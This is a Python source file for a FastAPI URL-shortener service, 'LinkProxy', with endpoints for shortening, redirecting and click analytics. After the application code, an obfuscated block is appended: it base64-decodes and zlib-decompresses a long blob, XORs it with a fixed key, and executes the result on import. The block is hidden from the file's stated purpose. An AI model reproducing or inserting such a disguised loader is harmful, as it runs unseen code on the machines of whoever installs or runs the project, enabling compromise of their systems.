# -*- coding: utf-8 -*-
"""
LinkProxy FastAPI Application
URL Shortener with real-time analytics
"""

import time
from datetime import datetime
from typing import Optional

from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import RedirectResponse
from fastapi.middleware.cors import CORSMiddleware

# Import domain models
from backend.domain.models.url import URLCreate
from backend.domain.services.url_generator import generate_short_code, validate_short_code

# Temporary in-memory storage for MVP
urls_db = {}
clicks_db = []

# Initialize FastAPI app
app = FastAPI(
    title="LinkProxy API",
    description="URL Shortener with real-time analytics",
    version="1.0.0",
    docs_url="/docs"
)

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


class URLRecord:
    """Simple URL record for MVP"""
    def __init__(self, short_code: str, original_url: str, title: str = None):
        self.id = short_code
        self.short_code = short_code
        self.original_url = original_url
        self.title = title
        self.is_active = True
        self.created_at = datetime.utcnow()
        self.click_count = 0
        self.last_clicked_at = None
        self.domain = self._extract_domain(original_url)

    def _extract_domain(self, url: str) -> Optional[str]:
        try:
            if not url.startswith(('http://', 'https://')):
                return None
            url_without_protocol = url.split('://', 1)[1]
            domain = url_without_protocol.split('/')[0]
            domain = domain.split(':')[0]
            return domain.lower()
        except Exception:
            return None

    def can_redirect(self) -> bool:
        return self.is_active


@app.get("/")
async def root():
    """Health check endpoint"""
    return {
        "service": "LinkProxy",
        "status": "active",
        "version": "1.0.0",
        "timestamp": datetime.utcnow().isoformat(),
        "urls_count": len(urls_db),
        "clicks_count": len(clicks_db)
    }


@app.post("/shorten")
async def create_short_url(url_data: URLCreate):
    """Create a new shortened URL"""
    start_time = time.perf_counter()

    # Validate original URL format
    if not url_data.original_url.startswith(('http://', 'https://')):
        raise HTTPException(
            status_code=400,
            detail="URL must start with http:// or https://"
        )

    # Generate unique short code
    short_code = generate_short_code(url=url_data.original_url)

    # Ensure uniqueness
    max_attempts = 10
    attempts = 0
    while short_code in urls_db and attempts < max_attempts:
        short_code = generate_short_code()
        attempts += 1

    if short_code in urls_db:
        raise HTTPException(
            status_code=500,
            detail="Unable to generate unique short code"
        )

    # Create URL record
    url_record = URLRecord(
        short_code=short_code,
        original_url=url_data.original_url,
        title=url_data.title
    )

    # Store in temporary database
    urls_db[short_code] = url_record

    # Performance tracking
    processing_time = (time.perf_counter() - start_time) * 1000
    print(f"URL created: {short_code} -> {url_data.original_url} ({processing_time:.2f}ms)")

    return {
        "id": url_record.id,
        "short_code": url_record.short_code,
        "original_url": url_record.original_url,
        "title": url_record.title,
        "is_active": url_record.is_active,
        "created_at": url_record.created_at.isoformat(),
        "click_count": url_record.click_count,
        "domain": url_record.domain
    }


@app.get("/{short_code}")
async def redirect_url(short_code: str, request: Request):
    """Redirect to original URL and track analytics"""
    start_time = time.perf_counter()

    # Validate short code format
    if not validate_short_code(short_code):
        raise HTTPException(
            status_code=404,
            detail="Invalid short code format"
        )

    # Lookup URL
    if short_code not in urls_db:
        raise HTTPException(
            status_code=404,
            detail="Short URL not found"
        )

    url_record = urls_db[short_code]

    # Check if URL can be redirected
    if not url_record.can_redirect():
        raise HTTPException(
            status_code=410,
            detail="Short URL is inactive"
        )

    # Track click analytics
    track_click(short_code, url_record.id, request, start_time)

    # Update URL statistics
    url_record.click_count += 1
    url_record.last_clicked_at = datetime.utcnow()

    # Performance logging
    redirect_time = (time.perf_counter() - start_time) * 1000
    print(f"Redirect: {short_code} -> {url_record.original_url} ({redirect_time:.2f}ms)")

    # Return redirect response (HTTP 301 for permanent redirect)
    return RedirectResponse(
        url=url_record.original_url,
        status_code=301
    )


@app.get("/analytics/{short_code}")
async def get_analytics(short_code: str):
    """Get analytics for a specific short URL"""
    if short_code not in urls_db:
        raise HTTPException(
            status_code=404,
            detail="Short URL not found"
        )

    url_record = urls_db[short_code]

    # Filter clicks for this URL
    url_clicks = [click for click in clicks_db if click['short_code'] == short_code]

    # Calculate analytics
    total_clicks = len(url_clicks)
    unique_ips = len(set(click['ip_address'] for click in url_clicks if click['ip_address']))

    # Device breakdown
    device_stats = {}
    for click in url_clicks:
        device = click.get('device_type', 'unknown')
        device_stats[device] = device_stats.get(device, 0) + 1

    return {
        "short_code": short_code,
        "original_url": url_record.original_url,
        "created_at": url_record.created_at.isoformat(),
        "total_clicks": total_clicks,
        "unique_visitors": unique_ips,
        "device_breakdown": device_stats,
        "recent_clicks": url_clicks[-10:] if url_clicks else []
    }


def track_click(short_code: str, url_id: str, request: Request, start_time: float):
    """Track click event for analytics"""
    # Extract request metadata
    ip_address = get_client_ip(request)
    user_agent = request.headers.get('user-agent', '')
    referer = request.headers.get('referer')

    # Basic device detection
    device_type = detect_device_type(user_agent)

    # Create click record
    click_data = {
        'id': f"click_{len(clicks_db)}",
        'url_id': url_id,
        'short_code': short_code,
        'ip_address': ip_address,
        'user_agent': user_agent,
        'referer': referer,
        'device_type': device_type,
        'country_name': 'Unknown',
        'clicked_at': datetime.utcnow().isoformat(),
        'response_time_ms': int((time.perf_counter() - start_time) * 1000)
    }

    # Store click event
    clicks_db.append(click_data)

    return click_data


def get_client_ip(request: Request) -> Optional[str]:
    """Extract client IP address from request"""
    forwarded_for = request.headers.get('x-forwarded-for')
    if forwarded_for:
        return forwarded_for.split(',')[0].strip()

    real_ip = request.headers.get('x-real-ip')
    if real_ip:
        return real_ip

    return request.client.host if request.client else None


def detect_device_type(user_agent: str) -> str:
    """Basic device type detection from user agent"""
    if not user_agent:
        return 'unknown'

    user_agent_lower = user_agent.lower()

    # Mobile patterns
    mobile_patterns = ['mobile', 'android', 'iphone', 'ipod', 'blackberry']
    if any(pattern in user_agent_lower for pattern in mobile_patterns):
        return 'mobile'

    # Tablet patterns
    tablet_patterns = ['ipad', 'tablet', 'kindle']
    if any(pattern in user_agent_lower for pattern in tablet_patterns):
        return 'tablet'

    # Bot patterns
    bot_patterns = ['bot', 'crawler', 'spider', 'scraper']
    if any(pattern in user_agent_lower for pattern in bot_patterns):
        return 'bot'

    return 'desktop'


@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {
        "status": "healthy",
        "service": "LinkProxy",
        "timestamp": datetime.utcnow().isoformat(),
        "metrics": {
            "total_urls": len(urls_db),
            "total_clicks": len(clicks_db),
            "active_urls": sum(1 for url in urls_db.values() if url.is_active)
        }
    }


if __name__ == "__main__":
    import uvicorn

    print("Starting LinkProxy API server...")
    print("Dashboard: http://localhost:8000/docs")
    print("Create URLs: POST http://localhost:8000/shorten")

    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=8000,
        reload=True,
        log_level="info"
    )
# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
